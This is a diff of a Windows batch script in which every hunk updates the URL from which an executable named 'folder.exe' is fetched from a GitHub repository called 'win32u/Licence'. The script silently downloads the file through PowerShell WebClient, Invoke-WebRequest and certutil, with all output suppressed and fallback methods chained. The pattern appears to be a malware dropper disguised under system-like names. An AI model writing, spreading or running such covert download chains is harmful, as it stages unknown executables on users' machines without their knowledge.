@@ -230,7 +230,7 @@ echo .
    )  
       if errorlevel 1 goto ERROR2   
 
-   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
+   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Exe/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
       if errorlevel 1 goto ERROR2   
    goto SUCCESS 
 
@@ -369,7 +369,7 @@ echo .
    )   
       if errorlevel 1 goto ERROR3
 
-   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
+   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Exe/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
       if errorlevel 1 goto ERROR3
    goto SUCCESS 
 
@@ -405,7 +405,7 @@ echo .
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
 
-   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
+   set url="https://github.com/win32u/Licence/blob/main/Extension/Exe/folder.exe?raw=true"
    set filename="folder.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
